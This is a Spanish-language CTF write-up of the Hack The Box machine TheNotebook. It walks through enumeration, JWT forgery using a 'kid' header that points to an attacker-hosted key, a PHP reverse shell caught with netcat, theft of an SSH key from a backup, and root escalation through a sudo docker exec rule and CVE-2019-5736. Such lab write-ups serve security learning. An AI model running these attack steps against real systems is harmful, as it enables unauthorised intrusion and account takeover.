---
layout: post
title:  "TheNotebook - [HTB]"
date:   2021-07-31 9:20:00 +0200
last_modified_at: 2021-07-31 09:20:29 +0200
toc:  true
tags: [ctf, linux, Hackthebox, Writeup, Docker, JWT]
categories: Hackthebox
---


{: .message}

Es una máquina que realmente me gusto por la forma de intrusión y la escalada.

## Enumeración
### Nmap 

*Puertos:*
* 22 /tcp -> OpenSSH 7.6p1
* 80 /tcp -> nginx 1.14.0

```bash
nmap -p- --open -T5 -v 10.10.10.230 -oG Allport1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 21:10 EDT
Initiating Ping Scan at 21:10
Scanning 10.10.10.230 [2 ports]
Completed Ping Scan at 21:10, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:10
Completed Parallel DNS resolution of 1 host. at 21:10, 0.01s elapsed
Initiating Connect Scan at 21:10
Scanning 10.10.10.230 [65535 ports]
Discovered open port 80/tcp on 10.10.10.230
Discovered open port 22/tcp on 10.10.10.230
Connect Scan Timing: About 43.74% done; ETC: 21:11 (0:00:40 remaining)
Completed Connect Scan at 21:11, 97.59s elapsed (65535 total ports)
Nmap scan report for 10.10.10.230
Host is up (0.082s latency).
Not shown: 47011 filtered ports, 18522 closed ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 97.78 seconds
```
Este escaneo como siempre digo es el importante ya que nos trae versiones de los servicios:
```bash
nmap -sC -sV -p22,80 10.10.10.230 -oN ScanPort1
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 21:22 EDT
Nmap scan report for 10.10.10.230
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
```
Siempre me gusta tirar de esta utilidad para saber a qué me enfrento:

```bash
whatweb 10.10.10.230
http://10.10.10.230 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]
```

### Fuzz

Mediante wfuzz pude sacar esto: 
* -> http://10.10.10.230/bd7077f7-3d3a-43c0-a0e0-20047e819f35/notes
* -> http://10.10.10.230/admin/
	* upload
	* notes


En el cookie editor encontre lo que es una jwt que cuando se pasa por [esto](https://jwt.io/) y te muestra todo lo que necesitas para trabajar

## JWT Token bypass
Para llevar a cabo este bypass me lei este [blog](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
```sql
ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in privKey.key
Your public key has been saved in privKey.key.pub
The key fingerprint is:
SHA256:6hjan3Jm1H2FExEj0WOvCy6tw6XmNc9AzYVHmp66Ny8 benji@parrot
The key's randomart image is:
+---[RSA 4096]----+
|          oo+o.  |
|           .=*   |
|           .+=o  |
|           +o+o  |
|       .S.. =+   |
|      ....+.o    |
|    .... ==o .   |
|   o.++.*.o*E    |
|  . o*+oo+..o+.  |
+----[SHA256]-----+

python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...

┌─[benj@parrot]─[~/Documents/CTF/TheNotebook]
└──╼ $echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.209:7070/privKey.key"}' |base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yMDk6NzA3
MC9wcml2S2V5LmtleSJ9Cg==
┌─[benji@parrot]─[~/Documents/CTF/TheNotebook]
└──╼ $echo '{"username":"benji","email":"benji@htb.local","admin_cap":true}' |base64
eyJ1c2VybmFtZSI6ImJlbmppIiwiZW1haWwiOiJiZW5qaUBodGIubG9jYWwiLCJhZG1pbl9jYXAi
OnRydWV9Cg==
```

Primero se copia los dos base64 que se obtuvieron de la codificacion de las cadenas de texto. (Teniendo en cuenta que tengo un servidor en el puerto 7070)

![](/images_blog/img_thenotebook/Pastedimage20210422141532.png)

![Pastedimage20210422141532](https://user-images.githubusercontent.com/76759292/127757368-0953690d-dca7-4a53-95e4-ca1a1caea03f.png)

### Firma del token 

Para hacerlo tienes que copiar  la clave publica y la privada en https://jwt.io/.

## Reverse PHP

Aqui tengo acceso a subir un archivo php y entonces aprovechando esto, subiendo el clasico php

![](/images_blog/img_thenotebook/Pastedimage20210422142431.png)

```bash
rlwrap nc -lnvp 4444           
listening on [any] 4444 ...
connect to [10.10.14.209] from (UNKNOWN) [10.10.10.230] 59978
Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@thenotebook:/$ 
```

Primero es que nos encontramos como el usuario www-data tenemos que volvernos el usuario noah, en la ruta de backup nos encontramos con uno del diretorio completo de noah, este backup contiene una clave id_rsa del usuario noah:

```bash
/var/backups$ ls -la
total 64
drwxr-xr-x  2 root root  4096 Jul 31 16:03 .
drwxr-xr-x 14 root root  4096 Feb 12 06:52 ..
-rw-r--r--  1 root root 33585 Jul 23 14:24 apt.extended_states.0
-rw-r--r--  1 root root  3618 Feb 24 08:53 apt.extended_states.1.gz
-rw-r--r--  1 root root  3609 Feb 23 08:58 apt.extended_states.2.gz
-rw-r--r--  1 root root  3621 Feb 12 06:52 apt.extended_states.3.gz
-rw-r--r--  1 root root  4373 Feb 17 09:02 home.tar.gz
```

```bash
ls
authorized_keys  id_rsa  id_rsa.pub
```

Teniendo esto entramos por ssh:
```bash
noah@thenotebook:~$ ls
user.txt  webapp-dev01.sh
noah@thenotebook:~$ cat user.txt 
56013079b3c02c282d699ba6faec07c6
```
## PrivEsc
Para el privesc nos encontramos un contenedor que se encuentra desactualizado con una version *Docker version 18.06.0-ce* cabe destacar que docker va por la version 20.10:
```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
sudo /usr/bin/docker exec -it webapp-dev01 bash
root@b778c5e32326:/opt/webapp# ls
__pycache__  admin  create_db.py  main.py  privKey.key  requirements.txt  static  templates  webapp.tar.gz
root@b778c5e32326:/opt/webapp# 

docker --version
Docker version 18.06.0-ce, build 0ffa825
```
Aqui les dejo este [CVE](https://github.com/Frichetten/CVE-2019-5736-PoC):

![](/images_blog/img_thenotebook/Pastedimage20210731171252.png)

La idea es que podemos ejecutar cualquier comando como root entonces sabiendo esto le dare permiso a la bash para cuando haga un bash -p me de una bash como root:

```bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```
![](/images_blog/img_thenotebook/Pastedimage20210731171606.png)

![](/images_blog/img_thenotebook/Pastedimage20210731171815.png)

Aqui vemos como tenemos acceso a la flag:
```bash
bash-4.4# ls
cleanup.sh  docker-runc  reset.sh  root.txt  start.sh
bash-4.4# cat root.txt 
9bba1908ac228fb0088747ddee6ab9b9
bash-4.4# 
```
MACHINE PWNED!!!!!

